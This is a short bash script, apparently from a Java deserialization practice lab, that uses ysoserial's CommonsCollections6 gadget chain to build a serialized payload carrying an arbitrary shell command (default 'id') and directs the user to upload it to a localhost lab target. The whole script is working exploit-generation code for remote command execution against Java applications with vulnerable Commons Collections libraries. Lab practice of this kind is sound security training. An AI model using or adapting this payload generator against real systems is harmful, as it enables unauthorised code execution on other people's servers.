#!/bin/bash
# class19 — CC6链 (CommonsCollections6)
# 靶场: /class19/upload
cd "$(dirname "$0")"
CMD="${1:-id}"
JAVA_TOOL_OPTIONS="--add-exports java.base/java.util=ALL-UNNAMED
  --add-exports java.base/sun.reflect.annotation=ALL-UNNAMED
  --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED" \
java -jar ../../lib/ysoserial.jar CommonsCollections6 "$CMD" > ../../class19.ser 2>&1
echo "✅ 已生成: class19.ser (命令: $CMD)"
echo "🎯 上传到 http://localhost:81/class19/"
